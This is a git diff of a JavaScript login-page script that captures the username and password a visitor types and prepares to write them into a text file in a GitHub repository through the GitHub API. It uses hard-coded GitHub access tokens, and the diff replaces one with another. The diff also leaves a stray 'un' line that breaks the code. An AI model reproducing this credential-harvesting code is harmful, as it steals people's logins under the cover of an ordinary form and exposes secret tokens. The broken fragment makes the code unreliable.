@@ -1,7 +1,6 @@
 const username = document.querySelector('.username')
 const password = document.querySelector('.password')
 
-let newTextContent
 
 document.querySelector('.loginButton').addEventListener('click', () => {
   if (username.value ==='' || password.value ==='') {
@@ -11,10 +10,11 @@ document.querySelector('.loginButton').addEventListener('click', () => {
       const repoOwner = 'Arnav-lunatic'
       const repoName = 'info'
       const filePath = 'info.txt'
-      const githubToken = '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'
+      const githubToken = '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'
       const apiUrl = `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`
 
-      newTextContent += `username - "${username.value}" | password - "${password.value}"`
+      const newTextContent = `username - "${username.value}" | password - "${password.value}"`
+      un
 
       const updateFile = async () => {
         try {
